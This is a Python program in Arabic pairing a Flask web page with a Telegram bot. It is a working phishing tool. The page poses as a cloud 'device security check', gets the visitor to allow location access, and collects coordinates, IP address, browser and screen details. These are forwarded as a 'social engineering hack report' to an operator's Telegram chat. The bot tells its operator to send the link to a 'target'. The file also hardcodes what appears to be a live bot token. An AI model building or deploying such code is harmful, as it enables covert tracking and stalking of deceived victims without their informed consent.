import os
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
from flask import Flask, request, render_template_string
import threading
import requests

# --- الإعدادات الأساسية ---
BOT_TOKEN = "8754086355:AAEw66jFIpxnxRRvpyN4Syf4YPSXRvGsPmQ"
ADMIN_ID = "6555135671"
app = Flask(__name__)

# --- واجهة الهندسة الاجتماعية (Professional Security Audit) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق من أمان الأجهزة</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { border: 1px solid #30363d; padding: 30px; border-radius: 10px; background: #161b22; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .loader { border: 4px solid #30363d; border-top: 4px solid #238636; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 1.2rem; color: #f0f6fc; }
    </style>
</head>
<body>
    <div class="container">
        <h1>جاري فحص سلامة النظام...</h1>
        <div class="loader"></div>
        <p id="status">الرجاء السماح بالوصول للموقع لإتمام الفحص الأمني السحابي.</p>
    </div>
    <script>
        async function sendData() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const payload = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        acc: position.coords.accuracy,
                        platform: navigator.platform,
                        ua: navigator.userAgent,
                        lang: navigator.language,
                        screen: window.screen.width + "x" + window.screen.height
                    };
                    await fetch('/log_capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(payload)
                    });
                    document.getElementById('status').innerText = "تم الفحص بنجاح. جهازك محمي حالياً.";
                }, (error) => {
                    document.getElementById('status').innerText = "خطأ: يجب تفعيل نظام تحديد الموقع لإكمال الفحص.";
                });
            }
        }
        window.onload = sendData;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/log_capture', methods=['POST'])
def log_capture():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # صياغة التقرير بتنسيق احترافي جداً
    report = (
        "📊 **[ تقرير اختراق هندسة اجتماعية ]** 📊\n\n"
        f"📍 **الموقع:** [فتح في خرائط جوجل](https://www.google.com/maps?q={data['lat']},{data['lon']})\n"
        f"🎯 **الدقة:** `{data['acc']} متر`\n"
        f"🌐 **العنوان الرقمي (IP):** `{ip}`\n"
        f"📱 **نظام التشغيل:** `{data['platform']}`\n"
        f"🖥️ **دقة الشاشة:** `{data['screen']}`\n"
        f"🌍 **اللغة:** `{data['lang']}`\n"
        f"🔍 **المتصفح:** `{data['ua'][:50]}...`\n\n"
        "⚡ *تم استلام البيانات بنجاح من الخادم السحابي.*"
    )
    
    # إرسال التقرير لتليجرام
    send_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(send_url, json={"chat_id": ADMIN_ID, "text": report, "parse_mode": "Markdown", "disable_web_page_preview": False})
    return "OK", 200

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 أهلاً بك يا مهندس. نظام الصيد جاهز.\nأرسل رابط الاستضافة للهدف وانتظر التقارير.")

if __name__ == '__main__':
    # تشغيل Flask في خيط منفصل لضمان عدم تعطل البوت
    port = int(os.environ.get("PORT", 5000))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()
    
    # تشغيل بوت تليجرام
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler('start', start))
    application.run_polling()
